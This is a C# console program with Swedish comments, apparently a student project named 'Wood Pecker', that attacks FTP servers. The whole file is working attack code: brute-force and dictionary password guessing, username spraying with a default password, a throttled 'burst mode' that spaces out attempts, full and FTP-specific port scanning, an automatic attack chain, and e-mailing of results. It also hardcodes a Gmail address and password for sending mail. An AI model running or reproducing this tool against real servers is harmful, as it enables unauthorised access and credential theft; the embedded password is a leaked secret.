using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Net.Mail;
using System.Text.RegularExpressions;

namespace BF
{
    class Program
    {
        static string username;
        static string userNameBruteForcePassword;
        static string IP;
        static string EmailSender;
        static int port;
        static int selected;

        //Dessa variabler används för att kontrollera om användaren vill skicka mail och/eller skriva loggfiler
        static bool SendEmail = false;
        static bool loggingEnable = false;
        static string logLocation = null;
        static string fileTitle = "Wood Pecker Statistics.txt";
        static string currentTime = DateTime.Now.ToString("yyyy" + "-" + "MM" + "-" + "dd" + "  " + "hh" + ";" + "mm" + ";" + "ss");

        //Variabler för statistik och logging information
        static string timeAttackFinished = DateTime.Now.ToString();
        static string correctPassword;
        static int bFcount = 0;

        //Menu metod som presenterar och läser in vad som skall ske härnäst
        public static void Menu()
        {
            bool exit = false;
            do
            {
                switch (GetMenuChoice())
                {
                    case 0: { return; }
                    case 1: { FtpProperties(); brute(); exit = true; break; }
                    case 2: { selected = 1; FtpProperties(); DictionaryAttack(); break; }
                    case 3: { selected = 2; FtpProperties(); UsernameBruteForce(); break; }
                    case 4: { FtpProperties(); BurstMode(); break; }
                    case 5: { PortScan(); break; }
                    case 6: { PortScanSpecific(); break; }
                    case 7:
                        {
                            AutomaticAttacks AutoAttack = new AutomaticAttacks();
                            AutomaticAttacks.AutoMaticFtpProperties();
                            AutomaticAttacks.AutoMaticPortScanSpecific();
                            AutomaticAttacks.AutoMaticDictionaryAttack();
                            Console.WriteLine("Next attack will begin within 3 seconds");
                            Thread.Sleep(3000);
                            AutomaticAttacks.brute();
                            break;
                        }
                    case 8: { Statistics(); break; }
                    case 9: { Email(); break; }
                    case 10: { HelpMenu(); break; }
                }
            } while (!exit);
        }
        //Presenterar hjälpmenyn och låter användaren välja vilken attack eller funktion som ska beskrivas
        public static void HelpMenu()
        {
            int helpChoice = 0;
            bool helpMenuExit = true;
            Presentation.HelpMenu();

            while (helpMenuExit)
            {
                Console.WriteLine("Select your attack");
                try
                {
                    helpChoice = int.Parse(Console.ReadLine());
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("You can only select from the interval of 0 - 10");
                    Console.ResetColor();
                    helpMenuExit = true;
                }
                //IF-sats som kontrollerar så det inte går att välja högre eller lägre än vad det finns alternativ i menyn..
                if (helpChoice > -1 && helpChoice < 11)
                {
                    if (helpChoice == 1)
                    {
                        Presentation.HelpBruteFoce();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 2)
                    {
                        Presentation.HelpDictionaryAttack();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 3)
                    {
                        Presentation.HelpUsernameBruteForce();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 4)
                    {
                        Presentation.HelpBurstMode();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 5)
                    {
                        Presentation.HelpPortScan();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 6)
                    {
                        Presentation.HelpQuickPortScan();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 7)
                    {
                        Presentation.HelpAutomaticAttack();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 8)
                    {
                        Presentation.HelpStatistics();
                        ContinueOnKeyPressed();
                    }
                    else if (helpChoice == 9)
                    {
                        Presentation.HelpEmail();
                        ContinueOnKeyPressed();
                    }
                    helpMenuExit = false;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("You can only select from the interval of 0 - 10");
                    Console.ResetColor();
                    helpMenuExit = true;
                }
            }
        }

        //Metod som läser in vad användaren väljer för val ur menyn. Kontrollerar att det inte är ett värde som inte finns.
        static int GetMenuChoice()
        {
            do
            {
                Thread.Sleep(600);
                Presentation.GetMenu();
                int menuChoice;

                //Läser av värdet i menyn och "outar" det valet till menyChoice, valet måste va inom 0-10 annars blir det  felmeddelande
                if (int.TryParse(Console.ReadLine(), out menuChoice) && (menuChoice >= 0 && menuChoice <= 10))
                {
                    return menuChoice;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("You can only select from the interval of 0 - 10");
                    Console.ResetColor();
                    Menu();
                }
            } while (true);
        }

        //Mainmetoden som läser in presenationen ur Presentation classen och hämtar Menu metoden.
        public static void Main()
        {
            //Console.WindowHeight sätter längden på consolefönstret
            Console.WindowHeight = 38;

            Presentation wt = new Presentation();
            Presentation.GetMenu();
            Menu();
        }

        //FtpPropeties används för att sätta värde till variablerna IP, Port och username
        static string FtpProperties()
        {
            //Variabler som håller i om looparna ska köras eller ej
            bool IpTrue = true;
            bool portTrue = true;

            while (IpTrue)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("===========================");
                Console.ResetColor();
                Console.Write("Select IP to the FTP Server: ");
                IP = Console.ReadLine();

                //match läser in variabeln IP, och kontrollerar värdet mot ett REGEX uttryck för att valdiera att det är en godkänd IP-Adress
                //är inte adressen godkänd fortsätter programmet att loopas tills att en korrekt IP-Adress väljs.
                Match match = Regex.Match(IP, @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}");
                if (match.Success)
                {
                    IpTrue = false;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("A correct IP-number is required");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                }
            }
            //Loop som kontrollerar att en korrekt port väljs, samt att värde inte överstiger 65535
            do
            {
                Console.Write("Select Port: ");
                try
                {
                    port = int.Parse(Console.ReadLine());
                    portTrue = false;
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Port can only be numerical");
                    Console.ResetColor();
                }
                if (port > 65535)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Port cannot be larger than 65535");
                    Console.ResetColor();
                    portTrue = true;
                }
            } while (portTrue);

            if (port == 0)
            {
                port = 21;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("WARNING, no port selected, using standard port 21");
                Console.ResetColor();
            }

            if (selected == 2)
            {
                Console.Write("Enter default password to try against username list: ");
                userNameBruteForcePassword = Console.ReadLine();
                return null;
            }
            Console.Write("Username: ");
            username = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("===========================================");
            Console.ResetColor();

            return null;
        }

        //Method för Brute Force Attacken
        static void brute()
        {
            //Pattern är en lista med bokstäver. Från a - z. Denna används för vilka bokstäver som ska vara med vid ett försök av brute force attacken.
            var Pattern = new List<string>() { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
            Combinator<string> Combinator = new Combinator<string>(Pattern);

            while (Combinator.HasFinised == false)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("===========================");
                    Console.WriteLine("Exiting");
                    Console.WriteLine("===========================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Brute Force ended..");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to go back to the menu");
                    Console.ReadLine();

                    Main();
                }

                var Combined = Combinator.Next();
                var pass = string.Join("", Combined);

                Console.WriteLine(pass);
                ftp Ftp = new ftp("ftp://" + IP, port, username, pass);

                if (Ftp.LoginCheck())
                {
                    if (loggingEnable)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("Statistics written to disc..");
                        Console.ResetColor();
                        WriteStatistics();
                    }
                    if (SendEmail)
                    {
                        SendingEmail();
                        Console.WriteLine("Email sent..");
                    }
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("The password was: {0}", pass);
                    Console.ResetColor();

                    ContinueOnKeyPressed();
                    Main();
                }
            }
        }

        static void Statistics()
        {
            string yesOrNoStatistics;

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("=====================================================================");
            Console.ResetColor();
            Console.WriteLine("Would you like to log the information when Wood Pecker is done attacking?");
            Console.WriteLine("(yes/no)");
            Console.Write("Select: ");
            yesOrNoStatistics = Console.ReadLine();
            if (yesOrNoStatistics == "y" || yesOrNoStatistics == "yes" || yesOrNoStatistics == "YES" || yesOrNoStatistics == "Yes")
            {
                try
                {
                    Console.WriteLine("Where would you like to save the logfiles?..");
                    logLocation = Console.ReadLine();
                    loggingEnable = true;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("=====================================================================");
                    Console.ResetColor();
                    Console.WriteLine("Wood Pecker will log the statistics on the location {0}", logLocation);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("=====================================================================");
                    Console.ResetColor();
                    ContinueOnKeyPressed();
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Something went terrible wrong, try again..");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.WriteLine("No logging will be done.");
                loggingEnable = false;
                ContinueOnKeyPressed();
                Menu();
            }
        }

        public static void WriteStatistics()
        {
            try
            {
                using (StreamWriter writer = new StreamWriter(logLocation + currentTime + " " + fileTitle + ".txt"))
                {
                    writer.WriteLine("==================================");
                    writer.WriteLine("==================================");
                    writer.WriteLine("======Wood Pecker Statistics======");
                    writer.WriteLine("==================================");
                    writer.WriteLine("==================================");
                }
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Something went terrible wrong when statistics was trying to be written..");
                Console.WriteLine("Bad location?");
                Console.ResetColor();
            }
            ContinueOnKeyPressed();
            Main();
        }

        //Dictionary Attack method
        static bool DictionaryAttack()
        {
            string dicLocation;
            Console.WriteLine("Enter location to dictionary: ");
            dicLocation = Console.ReadLine();

            try
            {
                //StreamReadern läser in sökvägen till textfilen med lösenorden
                using (StreamReader sr = new StreamReader(dicLocation))
                {
                    //Läser in hela textfilen, lagrar den i en array och splittar sedan ord för ord.
                    string line = sr.ReadToEnd();
                    string[] words = line.Split();

                    //prövar varje ord som lösenord från arrayen "words"
                    foreach (var word in words)
                    {
                        if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                        {
                            Console.WriteLine("Exiting");
                            break;
                        }
                        ftp Ftp = new ftp("ftp://" + IP, port, username, word);
                        Console.WriteLine(word);
                        if (Ftp.LoginCheck())
                        {
                            if (SendEmail)
                            {
                                SendingEmail();
                                Console.WriteLine("Email sent..");
                            }
                            if (loggingEnable)
                            {
                                WriteStatistics();
                                Console.WriteLine("Logs written..");
                            }
                            Console.WriteLine("Congratulations, you are connected to the server!");
                            ContinueOnKeyPressed();
                            Main();
                            return true;
                        }
                        else
                        {
                            Console.WriteLine("Wrong password");
                        }
                    }
                }

                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("===============================");
                Console.WriteLine("Finished with dictinary attacks");
                Console.WriteLine("===============================");
                Console.ResetColor();

                //Om attacken misslyckades och inget lösenord hittades hamnar vi här nedan
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No password found..");
                Console.ResetColor();

                ContinueOnKeyPressed();
                Main();
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("============================================");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Could not find the choosen path..");
                Console.WriteLine("Have you forgot to specify the fileformat..?");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("============================================");
                Console.ResetColor();
                ContinueOnKeyPressed();
            }
            return false;
        }

        //UsernameBruteForce Attack method
        static bool UsernameBruteForce()
        {
            int count = 0;
            string usernameListLocation;

            Console.Write("Enter location to the username list: ");
            usernameListLocation = Console.ReadLine();

            try
            {
                //StreamReadern läser in sökvägen till textfilen med lösenorden
                using (StreamReader sr = new StreamReader(usernameListLocation))
                {
                    //Läser in hela textfilen, lagrar den i en array och splittar sedan ord för ord.
                    string line = sr.ReadToEnd();
                    string[] usernamesFromList = line.Split();

                    //prövar varje ord som lösenord från arrayen "words"
                    foreach (var usernames in usernamesFromList)
                    {
                        count++;
                        if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                        {
                            Console.WriteLine("Exiting");
                            break;
                        }
                        ftp Ftp = new ftp("ftp://" + IP, port, usernames, userNameBruteForcePassword);

                        Console.WriteLine(usernames);

                        if (Ftp.LoginCheck())
                        {
                            if (SendEmail)
                            {
                                SendingEmail();
                                Console.WriteLine("Email sent..");
                            }
                            if (loggingEnable)
                            {
                                WriteStatistics();
                            }
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("The username was: {0} and the password was: {1}", usernames, userNameBruteForcePassword);
                            Console.ResetColor();
                            ContinueOnKeyPressed();
                            Main();
                        }
                        else
                        {
                            // Console.WriteLine("Fel lösenord");
                        }
                        Console.WriteLine(count);
                    }
                }
                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("==================================");
                Console.WriteLine("     Dictionary Attack failed     ");
                Console.WriteLine("==================================");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No match found between usernames and the default password, tried {0} usernames", count);
                Console.ResetColor();

                ContinueOnKeyPressed();
                Main();
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("==============================================");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Could not find list with usernames.. exiting..");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("==============================================");
                Console.ResetColor();
                ContinueOnKeyPressed();
            }
            return false;
        }
        
        //Burstmode attack metoden. Är som en brute force men med möjlighet att lägga  
        //in tidsintervaller där Wood Pecker ska vänta innan nästa attack utförst.
        static void BurstMode()
        {
            var Pattern = new List<string>() { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
            int secondsToWait = 0;
            int amountOfAttacksBeforePause = 0;
            bool endOfTHeJourney = true;
            bool endofJourney = true;
            bool exit = true;

            Console.Write("How many secounds would you like to wait between attacks: ");
            while (endofJourney)
            {
                try
                {
                    secondsToWait = int.Parse(Console.ReadLine());
                    endofJourney = false;
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Only numbers! Try again!");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                    Console.Write("How many secound would you like to wait between attacks: ");
                    endofJourney = true;
                }
            }

            Console.Write("How many tries would you like to do before the pause..?");
            while (endOfTHeJourney)
            {
                try
                {
                    amountOfAttacksBeforePause = int.Parse(Console.ReadLine());
                    endOfTHeJourney = false;
                }
                catch (Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Only numbers! Try again!");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("==============================================");
                    Console.ResetColor();
                    Console.Write("How many secound would you like to wait between attacks: ");
                    endOfTHeJourney = true;
                }
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("=====================================================");
            Console.ResetColor();
            Combinator<string> Combinator = new Combinator<string>(Pattern);

            while (exit)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("===========================");
                    Console.WriteLine("Exiting");
                    Console.WriteLine("===========================");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Brute Force ended..");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to go back to the menu");
                    Console.ReadLine();
                    break;
                }

                for (int i = 0; i < amountOfAttacksBeforePause; i++)
                {
                    var Combined = Combinator.Next();
                    var pass = string.Join("", Combined);

                    Console.WriteLine(pass);
                    ftp Ftp = new ftp("ftp://" + IP, port, username, pass);

                    correctPassword = pass;
                    bFcount++;

                    if (Ftp.LoginCheck())
                    {
                        if (SendEmail)
                        {
                            SendingEmail();
                            Console.WriteLine("Email sent..");
                        }
                        if (loggingEnable)
                        {
                            WriteStatistics();
                        }
                        Console.WriteLine("Congratulations, you are connected to the server");
                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                        Console.WriteLine("================================");
                        Console.WriteLine("=============STATISTIK==========");
                        Console.WriteLine("================================");
                        Console.ResetColor();
                        Console.WriteLine("Attack finished at: {0}", timeAttackFinished);
                        Console.WriteLine("Amount of tries before correct password: {0}", bFcount);
                        Console.WriteLine("Password is: {0}", correctPassword);
                        exit = false;
                        ContinueOnKeyPressed();
                        Console.Clear();
                        
                        break;
                    }
                }
                Thread.Sleep(secondsToWait * 1000);
                Console.WriteLine("");
            }
            //Kontroll för om E-post ska skickas eller ej.
            if (SendEmail)
            {
                SendingEmail();
                Console.WriteLine("Email sent..");

            }
            //Kontroll för om statistik ska skrivas eller ej.
            if (loggingEnable)
            {
                Console.WriteLine("Loggs where written");
                Console.ReadLine();
                Main();
            }
            else
            {
                Main();
            }
        }

        //Email metod som kontrollerar om ett E-post skall skickas, samt värden för hur detta ska göras.
        static void Email()
        {
            bool exit = false;
            string yesOrNo;
            while (!exit)
            {
                Console.WriteLine("Would you like to send email when Wood Pecker is done attacking? yes/no");
                yesOrNo = Console.ReadLine();
                if (yesOrNo == "y" || yesOrNo == "yes" || yesOrNo == "YES" || yesOrNo == "Yes")
                {
                    SendEmail = true;
                    Console.WriteLine("Enter selected Email where logging will be sent: ");
                    EmailSender = Console.ReadLine();
                    Console.WriteLine("Email will be sent once an attack is successfull or aborted with statistics");
                    exit = true;
                }
                else
                {
                    Console.WriteLine("No email will be sent.");
                    SendEmail = false;
                }
            }
        }
        //Om ett E-post ska skickas så används SendingEmail metoden. Här läses användaruppgifter in
        //och annan nödvändig information. Slutligen så försöker metoden att skicka iväg E-postet.
        static void SendingEmail()
        {
            MailMessage mail = new MailMessage();
            mail.From = new MailAddress("wp@gmail.com", "WoodPecker Statistics");
            mail.To.Add(EmailSender);
            mail.IsBodyHtml = true;
            mail.Subject = "Statistics..";
            mail.Body = string.Format(
                "Attack finished at: {0}", timeAttackFinished);
            mail.Priority = MailPriority.High;

            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            smtp.Credentials = new System.Net.NetworkCredential("woodpeckerresult@gmail.com", "Citronpaj");
            smtp.EnableSsl = true;
            try
            {
                smtp.Send(mail);
            }
            catch (Exception)
            {
                Console.WriteLine("EMail could not be sent.. Network problems?");
            }
        }

        static bool ScanPort(IPAddress Address, int Port)
        {
            TcpClient Client = new TcpClient();
            try
            {
                // Försöker ansluta till den angivna adressen samt porten. 
                Client.Connect(Address, Port);

                //Stäng strömmen
                NetworkStream ClientStream = Client.GetStream();
                ClientStream.Close();

                //Stäng TCP anslutningen
                Client.Close();
            }
            catch (SocketException)
            {
                //Antag att socket excaption betyder att anslutningen misslyckades och därför 
                //är anslutningen misslyckad.
                return false;
            }
            return true;
        }

        public static void PortScan()
        {
            string ScanAddress;
            bool isvalidIP = true;
            IPAddress ScanIPAddress;

            //match läser in variabeln IP, och kontrollerar värdet mot ett REGEX uttryck för att valdiera att det är en godkänd IP-Adress
            //är inte adressen godkänd fortsätter programmet att loopas tills att en korrekt IP-Adress väljs.
            do
            {
                Console.WriteLine("Enter IP Address: ");
                ScanAddress = Console.ReadLine();

                Match match = Regex.Match(ScanAddress, @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}");
                if (match.Success)
                {
                    Console.WriteLine("");
                    isvalidIP = false;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("A Correct IP-number is required");
                    Thread.Sleep(1300);
                    Console.ResetColor();
                }
            } while (isvalidIP);

            try
            {
                ScanIPAddress = IPAddress.Parse(ScanAddress);
                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;

                //Loopar igenom och scannar alla portar
                for (int Port = IPEndPoint.MinPort; Port < IPEndPoint.MaxPort; Port++)
                {
                    //Kontroll som lyssnar om Escape-tangenten trycks ned.
                    if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                    {
                        Console.WriteLine("Exiting");
                        break;
                    }
                    else
                    {
                        Console.Write("Scanning port {0}: ", Port);
                        if (ScanPort(ScanIPAddress, Port))
                        {
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("OPEN");
                            Console.ResetColor();
                            count++;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.WriteLine("CLOSED");
                            Console.ResetColor();
                            cPorts++;
                        }
                    }
                }

                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},", count);
                Console.WriteLine("Closed ports: {0},", cPorts);

                ContinueOnKeyPressed();
                Main();
            }
            //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }

        //Metod som scannar av specifika portar som FTP servern vanligtvis använder.
        static void PortScanSpecific()
        {
            string ScanAddress;
            bool isvaldiIpPortscanSpecefic = true;
            IPAddress ScanIPAddress;


            //match läser in variabeln IP, och kontrollerar värdet mot ett REGEX uttryck för att valdiera att det är en godkänd IP-Adress
            //är inte adressen godkänd fortsätter programmet att loopas tills att en korrekt IP-Adress väljs.
            do
            {
                Console.WriteLine("Enter IP Address: ");
                ScanAddress = Console.ReadLine();

                Match match = Regex.Match(ScanAddress, @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}");
                if (match.Success)
                {
                    Console.WriteLine("");
                    isvaldiIpPortscanSpecefic = false;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("A Correct IP-numbers i required");
                    Console.ResetColor();
                }
            } while (isvaldiIpPortscanSpecefic);

            try
            {
                ScanIPAddress = IPAddress.Parse(ScanAddress);
                Console.WriteLine("Port scanning {0} ({1})", ScanAddress, ScanIPAddress.ToString());

                //Räknare för öppna respektive stängda portar.
                int count = 0;
                int cPorts = 0;

                //Lista med utvalda portar att scanna
                List<int> ports = new List<int> { 20, 21, 22, 47, 69, 115, 152, 989, 990, 2121, 2811, 3305, 4993, 5402 };

                //Loopar igenom och scannar alla portar
                foreach (var port in ports)
                {
                    if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
                    {
                        Console.WriteLine("Exiting");
                        break;
                    }
                    Console.Write("Scanning port {0}: ", port);
                    if (ScanPort(ScanIPAddress, port))
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine("OPEN");
                        Console.ResetColor();
                        count++;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine("CLOSED");
                        Console.ResetColor();
                        cPorts++;
                    }
                }

                //När scanningen är slut
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("============================");
                Console.WriteLine("Finished scanning all ports");
                Console.WriteLine("============================");
                Console.ResetColor();
                Console.WriteLine("Open ports: {0},", count);
                Console.WriteLine("Closed ports: {0},", cPorts);
                ContinueOnKeyPressed();
            }
            //Om error skulle uppstå.
            catch (Exception)
            {
                Console.WriteLine("Exception caught!");
            }
        }

        //Method för att stanna programmet och fortsätta när en tangen trycks ned.
        public static void ContinueOnKeyPressed()
        {
            Console.WriteLine("Press any key to go back to the start menu!");
            Console.ReadKey();
        }
    }
}